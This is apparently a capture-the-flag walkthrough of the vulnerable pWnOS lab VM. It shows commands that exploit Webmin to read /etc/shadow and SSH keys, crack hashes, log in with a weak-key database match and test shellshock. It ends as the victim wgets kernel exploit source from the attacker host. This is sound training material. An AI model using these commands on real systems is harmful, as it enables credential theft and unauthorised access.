# pWnOS
![](https://i.imgur.com/LZmlT7R.png)
Use vmware and select "I Moved it." to import the image.

![](https://i.imgur.com/1JR58TI.png)
Host is `192.168.227.132`

![](https://i.imgur.com/hgb2Cyk.png)
Victim is `192.168.227.138`.

`nmap -sS -sV -p- -oN NamppWnOSLv1.txt 192.168.227.138`
![](https://i.imgur.com/uVmlN2s.png)

Nmap findings:
1. Target box is linux machine.
2. SSH server is enabled.
3. Apache server is listening on port 80.
4. webmin httpd version 0.01 is enabled on default port 10000

Let's first look at web, explore website in browser to find vulnerability for exploitation.

![](https://i.imgur.com/zOYS99w.png)

![](https://i.imgur.com/yTXIjQd.png)

![](https://i.imgur.com/SqnQpTO.png)

Use [Webminp](https://www.exploit-db.com/exploits/2017) to find out LFI.

Then we found file inclusion vulnerability  in `connect` parameter of query string with `/etc/passwd`. LFI is exploitable.

![](https://i.imgur.com/mMKkiMS.png)

Usernames found: `root`, `vmware`, `obama`, `osama`, `yomama`

Unfortunately, `/etc/shadow`, `/var/log/apache2/access.log` files are not accessible through website. So, can not proceed further using this path. RFI is URL file-access is disabled in the server configuration

Lets explore webmin.

`searchsploit webmin`, then we find the exploit `Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)`

![](https://i.imgur.com/z8lOjbG.png)

`cp /usr/share/exploitdb/exploits/multiple/remote/2017.pl .` to current folder and eecute it with instrument.

Here we got two option:
1. find the hash of password and crack it.
2. find the SSH autorized key and search from brutal force generated database.

## Crack Password
`./2017.pl 192.168.227.138 10000 /etc/shadow 0`

![](https://i.imgur.com/Z2yin15.png)

Now, we get the password hash, let's crack it with hashcat.
Download wordlist `sqlmap.txt` if yours missing.

`hashcat -m 500 -a 0 -o cracked.txt --force vmware.txt /usr/share/wordlists/sqlmap.txt`

![](https://i.imgur.com/uPIGigO.png)

Now we can ssh `vmware@h4ckm3` access to the VM.

## Crack SSH key
First, read the `/home/{username}/.ssh/authorized_keys` with webmin read file exploit.

`./2017.pl 192.168.227.138 10000 /home/obama/.ssh/authorized_keys 0`

![](https://i.imgur.com/jBeo4OI.png)

Since, authorized keys are accesible, let's try exploit

https://www.exploit-db.com/exploits/5720/

To use exploit, we must download database mentioned in exploit prior to execute exploit from this location and decompress.
`mkdir sshkeys`
`cd sshkeys`
`wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2`

`tar -vxjf 5622.tar.bz1` to decompressed the file and `grep` the key.

`grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ==`

![](https://i.imgur.com/JZjYO3E.png)

`cp sshkeys/rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 .`
`ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679  obama@192.168.227.138`

![](https://i.imgur.com/4dnwqlx.png)

## POE1

We can code review the webmin, than you will find it will run .cgi by perl. We can download exploit reverse shell from Kali VM and make it run by LFI by browser.

## POE2
Find the shellshock `env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c date`
![](https://i.imgur.com/N9WqvLH.png)

## POE3
`searchsploit linux kernel 2.6.2 local privilege`
You can use dirty-cow or vmsplice.

Copy and launch server for victim to download.
`cp /usr/share/exploitdb/exploits/linux/local/5092.c .`
`python -m SimpleHTTPServer 8000`

Back to victim ssh shell.
`cd /tmp`
`wget 192.168.227.132:8000/5092.c`
![](https://i.imgur.com/vJWLcVb.png)
